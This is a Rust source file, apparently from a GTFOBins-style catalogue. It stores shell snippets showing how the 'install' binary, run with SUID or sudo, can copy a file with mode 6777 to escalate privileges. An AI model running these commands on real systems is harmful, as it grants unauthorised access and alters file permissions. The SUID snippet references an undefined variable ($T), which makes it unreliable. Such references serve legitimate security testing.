pub static BIN_NAME: &'static str = "install";
pub static BIN_DESC: &'static str = "This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a copy of the file.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which install) .

    LFILE=file_to_change
    TF=$(mktemp)
    ./install -m 6777 $LFILE $T
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_change
    TF=$(mktemp)
    sudo install -m 6777 $LFILE $TF
"#;
use crate::code::{Code, Tag};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
